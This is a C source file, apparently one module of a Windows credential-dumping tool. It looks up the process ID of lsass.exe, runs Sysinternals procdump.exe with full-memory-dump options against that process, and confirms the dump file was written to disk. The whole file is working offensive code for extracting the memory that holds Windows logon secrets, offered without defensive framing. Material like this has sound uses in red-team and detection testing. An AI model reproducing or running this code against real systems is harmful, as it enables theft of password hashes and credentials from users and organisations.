/*****************************************************************************************************
*                                                                                                    *
*  File:         DumpProcdump.c                                                                      *
*  Purpose:      Performs lsass.exe dumping using a given external procdump.exe (Sysinternals).      *
*                                                                                                    *
******************************************************************************************************/
#include "DumpProcdump.h"
#include "Common.h"
#include <strsafe.h>

/*****************************************************************************************************
*                                                                                                    *
*  Constant:     PROCDUMP_COMMAND_LINE_MAX_LEN                                                       *
*  Purpose:      The maximum length of the procdump.exe command-line in characters.                  *
*                                                                                                    *
******************************************************************************************************/
#define PROCDUMP_COMMAND_LINE_MAX_LEN (MAX_PATH * 4)

/*****************************************************************************************************
*                                                                                                    *
*  Function:     DUMPPROCDUMP_DumpToDisk                                                             *
*                                                                                                    *
******************************************************************************************************/
__success(return >= 0)
RETSTATUS
DUMPPROCDUMP_DumpToDisk(
    __in DWORD nArgs,
    __in_ecount(nArgs) __notnull PWSTR* ppwszArgs
)
{
    RETSTATUS eStatus = RETSTATUS_UNEXPECTED;
    DWORD dwLsassPid = 0;
    WCHAR wszDumpPath[MAX_PATH] = { 0 };
    WCHAR wszCommandLine[PROCDUMP_COMMAND_LINE_MAX_LEN] = { 0 };
    WCHAR wszExpandedCommandLine[PROCDUMP_COMMAND_LINE_MAX_LEN] = { 0 };
    HRESULT hrStringResult = E_UNEXPECTED;

    // Validate arguments
    if (ARG_INDEX_UTILITY_PATH >= nArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid number of arguments");
        goto lblCleanup;
    }
    if (NULL == ppwszArgs)
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Invalid arguments (ppwszArgs=%p)", ppwszArgs);
        goto lblCleanup;
    }

    // Expand environment variables to the dump path
    if (0 == ExpandEnvironmentStringsW(ppwszArgs[ARG_INDEX_DUMP_PATH], wszDumpPath, ARRAYSIZE(wszDumpPath)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Resolve lsass.exe PID
    eStatus = COMMON_FindLsassPid(&dwLsassPid);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_FindLsassPid failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Build the procdump commandline
    hrStringResult = StringCchPrintfW(wszCommandLine, ARRAYSIZE(wszCommandLine), L"\"%s\" -accepteula -ma %lu \"%s\"", ppwszArgs[ARG_INDEX_UTILITY_PATH], dwLsassPid, wszDumpPath);
    if (FAILED(hrStringResult))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"StringCchPrintfW() failed (hrStringResult=%.8x)", hrStringResult);
        goto lblCleanup;
    }

    // Expand all environment variables
    if (0 == ExpandEnvironmentStringsW(wszCommandLine, wszExpandedCommandLine, ARRAYSIZE(wszExpandedCommandLine)))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"ExpandEnvironmentStringsW() failed (LastError=%lu)", GetLastError());
        goto lblCleanup;
    }

    // Run the process
    eStatus = COMMON_RunProcess(wszExpandedCommandLine, TRUE, TRUE, NULL, NULL);
    if (RETSTATUS_FAILED(eStatus))
    {
        DEBUG_MSG(L"COMMON_RunProcess failed (eStatus=%.8x)", eStatus);
        goto lblCleanup;
    }

    // Procdump doesn't indicate success well upon its exit level so we simply look for the output file
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributesW(wszDumpPath))
    {
        eStatus = RETSTATUS_FAILURE_MSG(L"Procdump did not seem to successfully create a dump file at path (wszDumpPath=%s)", wszDumpPath);
        goto lblCleanup;
    }

    // Success
    eStatus = RETSTATUS_SUCCESS;

lblCleanup:

    // Return result
    return eStatus;
}
